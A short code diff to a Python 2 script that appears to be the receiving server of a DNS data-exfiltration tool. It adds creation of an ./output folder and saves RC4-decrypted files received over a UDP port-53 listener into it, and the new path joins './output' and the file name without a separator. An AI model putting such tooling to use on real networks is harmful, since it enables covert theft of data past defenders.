@@ -108,7 +108,13 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
 	parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
-	args = parser.parse_args() 
+	args = parser.parse_args()
+
+	#------------------------------------------------------------------------------
+	# Check that required directories and path are available, if not create them
+	if not os.path.isdir("./output"):
+		os.makedirs("./output")
+		print color("[+] Creating [./output] directory for incoming files")
 
 	# Setup a UDP server listening on port UDP 53	
 	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -168,7 +174,7 @@ if __name__ == '__main__':
 						rc4Decryptor = RC4(args.password)
 						
 						# Save data to a file
-						outputFileName = fileName + ".zip"
+						outputFileName = "./output" + fileName + ".zip"
 						print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
 						with open(outputFileName, 'wb+') as fileHandle:
 							fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(decode(fileData))))
